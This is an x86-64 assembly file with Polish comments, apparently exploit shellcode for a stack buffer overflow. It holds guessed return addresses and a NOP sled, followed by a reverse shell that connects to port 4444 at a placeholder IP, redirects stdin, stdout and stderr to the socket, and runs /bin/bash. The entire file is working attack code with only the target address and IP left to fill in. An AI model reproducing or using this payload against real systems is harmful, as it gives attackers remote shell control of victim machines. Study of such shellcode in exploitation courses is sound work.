global _start

section .text

; Nie obsługujemy błędów wywołań systemowych, bo i tak nic się z nimi nie da zrobić.

align 16
times 6 dq 0x<buff> + 64      ; zgadnięty adres stosu
times 80 nop                        ; ślizganie się po NOP-ach

_start:
  mov     eax, 41                   ; sys_socket
  mov     edi, 2                    ; family = AF_INET
  mov     esi, 1                    ; type = SOCK_STREAM
  syscall

  mov     edi, eax                  ; fd
  mov     eax, 42                   ; sys_connect
  lea     rsi, [rel sockaddr]       ; adres struktury sockaddr
  mov     edx, 16                   ; rozmiar struktury sockaddr
  syscall

  mov     eax, 33                   ; sys_dup2
  mov     esi, 2                    ; stderr
  syscall

  mov     eax, 33                   ; sys_dup2
  mov     esi, 1                    ; stdout
  syscall

  mov     eax, 33                   ; sys_dup2
  xor     esi, esi                  ; stdin
  syscall

  mov     eax, 59                   ; sys_execve
  lea     rdi, [rel shell_command]  ; nazwa programu do wywołania
  xor     esi, esi                  ; adres tablicy parametrów
  xor     edx, edx                  ; adres tablicy ze zmiennymi środowiskowymi
  syscall

shell_command:
  db '/bin/bash', 0

align 16
sockaddr:
  dw 2                              ; family = AF_INET
  dw 0x115c                         ; numer portu 0x115c = 4444
  db <ip>                   ; adres IPv4 127.0.0.1
  dq 0                              ; wypełnienie
